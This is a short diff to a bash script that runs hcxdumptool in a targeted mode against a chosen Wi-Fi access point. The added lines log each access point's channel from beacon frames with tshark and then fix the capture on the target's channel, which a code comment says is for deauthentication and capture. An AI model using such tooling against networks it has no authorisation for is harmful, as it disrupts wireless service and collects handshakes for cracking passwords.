@@ -89,6 +89,10 @@ start_hcx() {
     [ -n "$ch" ] && chopt=(-c "$ch")
     if [ "$MODE" = "targeted" ] && [ -n "$TGT_BSSID" ]; then
         echo "$TGT_BSSID" | tr -d ':' | tr 'A-F' 'a-f' > "$FILTER"
+        # Lock onto the target's channel (learned during the previous sweep), so
+        # the deauth and capture actually sit on the right frequency.
+        [ -z "$TGT_CHAN" ] && TGT_CHAN=$(awk -v b="$(echo "$TGT_BSSID" | tr 'A-F' 'a-f')" \
+            '$1==b{print $2; exit}' "$RUN_DIR/channels.txt" 2>/dev/null)
         [ -n "$TGT_CHAN" ] && chopt=(-c "$TGT_CHAN")
         hcxdumptool -i "$i" -w "$PCAP" "${chopt[@]}" \
             --filterlist_ap="$FILTER" --filtermode=2 \
@@ -186,6 +190,11 @@ while true; do
 
         # APs seen = distinct named networks, so it matches the list below.
         aps=${#STATUS[@]}
+
+        # Remember each AP's channel, so a later targeted capture can lock onto it.
+        tshark -r "$PCAP" -Y "wlan.fc.type_subtype==0x08" -T fields \
+               -e wlan.bssid -e wlan.ds.current_channel 2>/dev/null \
+               | tr 'A-F' 'a-f' | awk 'NF==2 && $2!="" && !s[$1]++' > "$RUN_DIR/channels.txt" 2>/dev/null
 
         # 3) Build the list, best status first, capped for readability.
         items=""; n=0
